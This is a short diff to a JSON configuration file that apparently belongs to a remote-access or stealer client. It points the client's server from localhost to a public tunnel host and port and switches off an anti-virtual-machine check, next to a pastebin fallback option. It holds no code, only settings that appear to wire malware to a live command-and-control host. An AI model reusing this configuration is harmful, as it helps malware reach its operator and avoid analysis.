@@ -1,10 +1,10 @@
 ﻿{
   "debug": true,
   "binfile": false,
-  "antivm": true,
+  "antivm": false,
 
-  "server": "127.0.0.1",
-  "port": 6969,
+  "server": "30.ip.gl.ply.gg",
+  "port": 37529,
 
   "pastebin": false,
   "pastebinlink": "",
